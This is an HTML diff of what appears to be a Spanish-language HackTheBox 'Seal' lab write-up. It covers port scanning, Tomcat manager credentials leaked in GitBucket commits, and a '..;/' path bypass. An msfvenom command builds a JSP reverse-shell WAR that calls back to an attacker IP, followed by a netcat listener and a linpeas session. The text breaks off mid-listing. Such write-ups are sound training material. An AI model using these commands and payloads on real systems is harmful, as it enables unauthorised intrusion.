@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Seal HTB Writeup - </title><meta name="author" content="">
+<meta name="author-link" content="">
+<meta name="description" content="Seal HTB WriteUp - Medium Linux Machine from HackTheBox" /><meta name="keywords" content='linux, writeup, medium' /><meta itemprop="name" content="Seal HTB Writeup">
+<meta itemprop="description" content="Seal HTB WriteUp - Medium Linux Machine from HackTheBox"><meta itemprop="datePublished" content="2021-11-03T15:39:08+02:00" />
+<meta itemprop="dateModified" content="2021-11-03T15:39:08+02:00" />
+<meta itemprop="wordCount" content="1300">
+<meta itemprop="keywords" content="linux,writeup,medium," /><meta property="og:title" content="Seal HTB Writeup" />
+<meta property="og:description" content="Seal HTB WriteUp - Medium Linux Machine from HackTheBox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/seal-htb/seal-htb/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-03T15:39:08+02:00" />
+<meta property="article:modified_time" content="2021-11-03T15:39:08+02:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Seal HTB Writeup"/>
+<meta name="twitter:description" content="Seal HTB WriteUp - Medium Linux Machine from HackTheBox"/>
+<meta name="application-name" content="rottenbytes">
+<meta name="apple-mobile-web-app-title" content="rottenbytes"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/posts/seal-htb/seal-htb/" /><link rel="prev" href="/posts/zeno-thm/zeno-thm/" /><link rel="next" href="/posts/local-shellcode-storage/local-shellcode-storage/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Seal HTB Writeup",
+    "inLanguage": "",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "\/posts\/seal-htb\/seal-htb\/"
+    },"genre": "posts","keywords": "linux, writeup, medium","wordcount":  1300 ,
+    "url": "\/posts\/seal-htb\/seal-htb\/","datePublished": "2021-11-03T15:39:08+02:00","dateModified": "2021-11-03T15:39:08+02:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "rottenbytes"
+      },"description": "Seal HTB WriteUp - Medium Linux Machine from HackTheBox"
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title=""><span id="typeit-header-desktop" class="typeit"></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title=""><span id="typeit-header-title-mobile" class="typeit"></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Seal HTB Writeup</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      rottenbytes</span></span>
+          <span class="post-category">included in <a href="/categories/writeups/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> writeups</a>&ensp;<a href="/categories/htb/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> htb</a></span></div>
+      <div class="post-meta-line"><span title="published on 2021-11-03 15:39:08"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2021-11-03">2021-11-03</time></span>&nbsp;<span title="Updated on 2021-11-03 15:39:08"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2021-11-03">2021-11-03</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>1300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+    </div><div class="featured-image"><img loading="lazy" src="../assets/posts/seal/info_card.png" srcset="/../assets/posts/seal/info_card.png, ../assets/posts/seal/info_card.png 1.5x, /../assets/posts/seal/info_card.png 2x" sizes="auto" data-title="Seal HTB WriteUp - Medium Linux Machine from HackTheBox" data-alt="/../assets/posts/seal/info_card.png" width="592" height="356" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introducción">Introducción:</a></li>
+    <li><a href="#enumeración">Enumeración</a>
+      <ul>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#enumeración-https---port-443-tcp">Enumeración HTTPs - port 443 (TCP)</a></li>
+        <li><a href="#enumeración-http---port-8080-tcp">Enumeración HTTP - port 8080 (TCP)</a></li>
+      </ul>
+    </li>
+    <li><a href="#explotación">Explotación</a>
+      <ul>
+        <li><a href="#apache-tomcat">Apache Tomcat</a></li>
+        <li><a href="#usertxt">user.txt</a></li>
+      </ul>
+    </li>
+    <li><a href="#priv-esc">Priv. Esc.</a>
+      <ul>
+        <li><a href="#roottxt">root.txt</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="introducción">Introducción:</h2>
+<p>Se trata de una máquina Linux de dificultad media, en la que tendremos que acceder a un <em>GitBook</em> para buscar en los commits unas credenciales válidas y así entrar en el <em>manager</em> de un <em>Apache Tomcat</em>, para así poder subir una <em>reverse shell</em>. Tendremos que explotar un <em>cronjob</em> para escalar a un usuario con mayores privilegios y así, aprovecharnos de que podemos ejecutar <em>ansible-playbook</em> como sudo para <em>spawnear</em> una <em>shell</em> como root.</p>
+<h2 id="enumeración">Enumeración</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+443/tcp  open  ssl/http   nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Seal Market
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>seal.htb/organizationName<span style="color:#f92672">=</span>Seal Pvt Ltd/stateOrProvinceName<span style="color:#f92672">=</span>London/countryName<span style="color:#f92672">=</span>UK
+| Not valid before: 2021-05-05T10:24:03
+|_Not valid after:  2022-05-05T10:24:03
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+8080/tcp open  http-proxy
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized
+|     Date: Thu, <span style="color:#ae81ff">15</span> Jul <span style="color:#ae81ff">2021</span> 09:39:09 GMT
+|     Set-Cookie: JSESSIONID<span style="color:#f92672">=</span>node0aouun01x0sekzoqmc5tettib2.node0; Path<span style="color:#f92672">=</span>/; HttpOnly
+|     Expires: Thu, <span style="color:#ae81ff">01</span> Jan <span style="color:#ae81ff">1970</span> 00:00:00 GMT
+|     Content-Type: text/html;charset<span style="color:#f92672">=</span>utf-8
+|     Content-Length: <span style="color:#ae81ff">0</span>
+|   GetRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized
+|     Date: Thu, <span style="color:#ae81ff">15</span> Jul <span style="color:#ae81ff">2021</span> 09:39:09 GMT
+|     Set-Cookie: JSESSIONID<span style="color:#f92672">=</span>node015f0dsw3wxpyq1hymn6rdfuhxa0.node0; Path<span style="color:#f92672">=</span>/; HttpOnly
+|     Expires: Thu, <span style="color:#ae81ff">01</span> Jan <span style="color:#ae81ff">1970</span> 00:00:00 GMT
+|     Content-Type: text/html;charset<span style="color:#f92672">=</span>utf-8
+|     Content-Length: <span style="color:#ae81ff">0</span>
+|   HTTPOptions: 
+|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+|     Date: Thu, <span style="color:#ae81ff">15</span> Jul <span style="color:#ae81ff">2021</span> 09:39:09 GMT
+|     Set-Cookie: JSESSIONID<span style="color:#f92672">=</span>node01hknkcb1q7hi3t8swnbids9h41.node0; Path<span style="color:#f92672">=</span>/; HttpOnly
+|     Expires: Thu, <span style="color:#ae81ff">01</span> Jan <span style="color:#ae81ff">1970</span> 00:00:00 GMT
+|     Content-Type: text/html;charset<span style="color:#f92672">=</span>utf-8
+|     Allow: GET,HEAD,POST,OPTIONS
+|     Content-Length: <span style="color:#ae81ff">0</span>
+|   RPCCheck: 
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Illegal character OTEXT<span style="color:#f92672">=</span>0x80
+|     Content-Type: text/html;charset<span style="color:#f92672">=</span>iso-8859-1
+|     Content-Length: <span style="color:#ae81ff">71</span>
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT<span style="color:#f92672">=</span>0x80&lt;/pre&gt;
+|   RTSPRequest: 
+|     HTTP/1.1 <span style="color:#ae81ff">505</span> Unknown Version
+|     Content-Type: text/html;charset<span style="color:#f92672">=</span>iso-8859-1
+|     Content-Length: <span style="color:#ae81ff">58</span>
+|     Connection: close
+|     &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt;
+|   Socks4: 
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Illegal character CNTL<span style="color:#f92672">=</span>0x4
+|     Content-Type: text/html;charset<span style="color:#f92672">=</span>iso-8859-1
+|     Content-Length: <span style="color:#ae81ff">69</span>
+|     Connection: close
+|     &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL<span style="color:#f92672">=</span>0x4&lt;/pre&gt;
+|   Socks5: 
+|     HTTP/1.1 <span style="color:#ae81ff">400</span> Illegal character CNTL<span style="color:#f92672">=</span>0x5
+|     Content-Type: text/html;charset<span style="color:#f92672">=</span>iso-8859-1
+|     Content-Length: <span style="color:#ae81ff">69</span>
+|     Connection: close
+|_    &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL<span style="color:#f92672">=</span>0x5&lt;/pre&gt;
+| http-auth: 
+| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+|_  Server returned status <span style="color:#ae81ff">401</span> but no WWW-Authenticate header.
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#f92672">)</span>.
+</code></pre></div><p>Observamos que tenemos 3 puertos abiertos, el puerto 22 (SSH), el puerto 443 (HTTPS) y el puerto 8080 (HTTP).</p>
+<h3 id="enumeración-https---port-443-tcp">Enumeración HTTPs - port 443 (TCP)</h3>
+<p><img loading="lazy" src="../assets/posts/seal/seal_https_web.png" srcset="/../assets/posts/seal/seal_https_web.png, ../assets/posts/seal/seal_https_web.png 1.5x, /../assets/posts/seal/seal_https_web.png 2x" sizes="auto" data-title="/../assets/posts/seal/seal_https_web.png" data-alt="/../assets/posts/seal/seal_https_web.png" width="1916" height="979" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Vemos que es un Nginx 1.18.0, revisando el código fuente no encontramos nada interesante. Tras estar un rato navegando por la web no se ve nada extraño. La única funcionalidad aparente que tiene la web es que podemos buscar por verduras.</p>
+<h4 id="dirsearch">Dirsearch</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>10:41:37<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /js  -&gt;  http://seal.htb/js/
+<span style="color:#f92672">[</span>10:41:43<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -  804B  - /<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\.</span>.<span style="color:#ae81ff">\e</span>tc<span style="color:#ae81ff">\p</span>asswd
+<span style="color:#f92672">[</span>10:41:43<span style="color:#f92672">]</span> <span style="color:#ae81ff">400</span> -  804B  - /a%5c.aspx
+<span style="color:#f92672">[</span>10:41:44<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /admin  -&gt;  http://seal.htb/admin/
+<span style="color:#f92672">[</span>10:41:50<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /css  -&gt;  http://seal.htb/css/
+<span style="color:#f92672">[</span>10:41:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  564B  - /host-manager/html
+<span style="color:#f92672">[</span>10:41:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /host-manager/  -&gt;  http://seal.htb/host-manager/html
+<span style="color:#f92672">[</span>10:41:54<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /icon  -&gt;  http://seal.htb/icon/
+<span style="color:#f92672">[</span>10:41:54<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /images  -&gt;  http://seal.htb/images/
+<span style="color:#f92672">[</span>10:41:54<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   19KB - /index.html
+<span style="color:#f92672">[</span>10:41:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /manager  -&gt;  http://seal.htb/manager/
+<span style="color:#f92672">[</span>10:41:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -    0B  - /manager/  -&gt;  http://seal.htb/manager/html
+<span style="color:#f92672">[</span>10:41:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  564B  - /manager/html
+<span style="color:#f92672">[</span>10:41:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">403</span> -  564B  - /manager/html/
+<span style="color:#f92672">[</span>10:41:55<span style="color:#f92672">]</span> <span style="color:#ae81ff">401</span> -    2KB - /manager/status/all
+</code></pre></div><p>Fuzzeando la web podemos sacar varios directorios. Al acceder al directorio <em>/admin</em> nos da un error <code>404</code>, pero nos indica que es un <em>Apache Tomcat 9.0.31</em></p>
+<p><img loading="lazy" src="../assets/posts/seal/seal_https_admin_apache.png" srcset="/../assets/posts/seal/seal_https_admin_apache.png, ../assets/posts/seal/seal_https_admin_apache.png 1.5x, /../assets/posts/seal/seal_https_admin_apache.png 2x" sizes="auto" data-title="/../assets/posts/seal/seal_https_admin_apache.png" data-alt="/../assets/posts/seal/seal_https_admin_apache.png" width="726" height="178" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Si tratamos de acceder a <em>/manager/status</em> nos salta el <em>pop-up</em> de Tomcat para acceder al <em>manager</em>.</p>
+<p><img loading="lazy" src="../assets/posts/seal/apache_manager.png" srcset="/../assets/posts/seal/apache_manager.png, ../assets/posts/seal/apache_manager.png 1.5x, /../assets/posts/seal/apache_manager.png 2x" sizes="auto" data-title="/../assets/posts/seal/apache_manager.png" data-alt="/../assets/posts/seal/apache_manager.png" width="710" height="181" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Las credenciales por defecto de Tomcat (<code>tomcat:s3cret</code>) no aplican.</p>
+<h3 id="enumeración-http---port-8080-tcp">Enumeración HTTP - port 8080 (TCP)</h3>
+<p>Al acceder al puerto <code>8080</code> vemos que se trata de un <em>GitBucket</em>, pero no nos deja acceder a los repositorios a no ser que estemos logueados. Podemos crear una cuenta para acceder a él.</p>
+<p><img loading="lazy" src="../assets/posts/seal/8080_gitbucket.png" srcset="/../assets/posts/seal/8080_gitbucket.png, ../assets/posts/seal/8080_gitbucket.png 1.5x, /../assets/posts/seal/8080_gitbucket.png 2x" sizes="auto" data-title="/../assets/posts/seal/8080_gitbucket.png" data-alt="/../assets/posts/seal/8080_gitbucket.png" width="1920" height="467" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Hay solamente dos repositorios creados por el usuario <code>root</code>,  <em>seal_market</em> e <em>infra</em>. Podemos observar que el repositorio de <em>seal_market</em> contiene varios <em>commits</em>.</p>
+<p><img loading="lazy" src="../assets/posts/seal/commits.png" srcset="/../assets/posts/seal/commits.png, ../assets/posts/seal/commits.png 1.5x, /../assets/posts/seal/commits.png 2x" sizes="auto" data-title="/../assets/posts/seal/commits.png" data-alt="/../assets/posts/seal/commits.png" width="1678" height="878" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>En uno de estos <em>commits</em> podemos observar que dejaron unas credenciales por defecto.</p>
+<p><img loading="lazy" src="../assets/posts/seal/one_piece.png" srcset="/../assets/posts/seal/one_piece.png, ../assets/posts/seal/one_piece.png 1.5x, /../assets/posts/seal/one_piece.png 2x" sizes="auto" data-title="/../assets/posts/seal/one_piece.png" data-alt="/../assets/posts/seal/one_piece.png" width="717" height="894" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>tomcat</td>
+<td>42MrHBf*z8{Z%</td>
+</tr>
+</tbody>
+</table>
+<h2 id="explotación">Explotación</h2>
+<h3 id="apache-tomcat">Apache Tomcat</h3>
+<p>Al insertar las credenciales en el <em>manager</em> de Tomcat, vemos que son válidas y tenemos acceso.</p>
+<p><img loading="lazy" src="../assets/posts/seal/tomcat_manager.png" srcset="/../assets/posts/seal/tomcat_manager.png, ../assets/posts/seal/tomcat_manager.png 1.5x, /../assets/posts/seal/tomcat_manager.png 2x" sizes="auto" data-title="/../assets/posts/seal/tomcat_manager.png" data-alt="/../assets/posts/seal/tomcat_manager.png" width="1909" height="848" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p><em>Dirsearch</em> nos da una pista: <code>302 - 0B - /manager/status/..;/ -&gt; http://seal.htb/manager/html</code>. Lo que me hace pensar en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal#bypass--with-"target="_blank" rel="external nofollow noopener noreferrer">PayloadsAllTheThings - Directory Traversal</a>. Conseguimos entrar al directorio <em>/html</em> para subir nuestra shell.</p>
+<p><img loading="lazy" src="../assets/posts/seal/dir_trav.png" srcset="/../assets/posts/seal/dir_trav.png, ../assets/posts/seal/dir_trav.png 1.5x, /../assets/posts/seal/dir_trav.png 2x" sizes="auto" data-title="/../assets/posts/seal/dir_trav.png" data-alt="/../assets/posts/seal/dir_trav.png" width="1909" height="974" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Para crear la shell hago uso de <em>msfvenom</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.12 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">9001</span> -f war &gt; shell.war
+</code></pre></div><p>Al intentar hacerle el <em>deploy</em>, nos da un <code>403 Forbidden</code>. Así que trato de interceptar la petición con <em>Burp Suite</em> y modificarla para bypassear el <em>Forbidden</em></p>
+<p><img loading="lazy" src="../assets/posts/seal/bypass.png" srcset="/../assets/posts/seal/bypass.png, ../assets/posts/seal/bypass.png 1.5x, /../assets/posts/seal/bypass.png 2x" sizes="auto" data-title="/../assets/posts/seal/bypass.png" data-alt="/../assets/posts/seal/bypass.png" width="1514" height="67" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>Nos da un <code>200 OK</code>. Ponemos un puerto a la escucha y al acceder a la <em>shell</em> establecemos la conexión.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rlwrap nc -lvnp <span style="color:#ae81ff">9001</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.12<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.250<span style="color:#f92672">]</span> <span style="color:#ae81ff">40142</span>
+python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+tomcat@seal:/var/lib/tomcat9$ 
+</code></pre></div><h3 id="usertxt">user.txt</h3>
+<p>Haciendo uso de <em>Linpeas</em>, obtenemos que hay una tarea ejecutándose:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">══════════════════════════════╣ Processes, Cron, Services, Timers &amp; Sockets ╠════════════════════════════════                                                                         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Cleaned processes 
+
+...snip...
+
+luis         <span style="color:#ae81ff">908</span>  0.0  0.0   <span style="color:#ae81ff">2608</span>   <span style="color:#ae81ff">592</span> ?        Ss   08:32   0:00  |   _ /bin/sh -c java -jar /home/luis/gitbucket.war                                                                luis         <span style="color:#ae81ff">911</span>  1.9  9.4 <span style="color:#ae81ff">3681140</span> <span style="color:#ae81ff">382776</span> ?      Sl   08:32   1:52  |       _ java -jar /home/luis/gitbucket.war     
+root       <span style="color:#ae81ff">19126</span>  0.0  0.0   <span style="color:#ae81ff">2608</span>   <span style="color:#ae81ff">544</span> ?        Ss   10:10   0:00      _ /bin/sh -c sleep <span style="color:#ae81ff">30</span> <span style="color:#f92672">&amp;&amp;</span> sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml                         
+
+...snip...
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Backup files
+-rw-rw-r-- <span style="color:#ae81ff">1</span> luis luis <span style="color:#ae81ff">606047</span> Jul <span style="color:#ae81ff">16</span> 10:11 /opt/backups/archives/backup-2021-07-16-10:11:36.gz
+-rw-rw-r-- <span style="color:#ae81ff">1</span> luis luis <span style="color:#ae81ff">606047</span> Jul <span style="color:#ae81ff">16</span> 10:10 /opt/backups/archives/backup-2021-07-16-10:10:32.gz
+</code></pre></div><p>Podemos observar de qué trata esta tarea:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@seal:/opt/backups/playbook$ cat run.yml
+- hosts: localhost
+  tasks:
+  - name: Copy Files
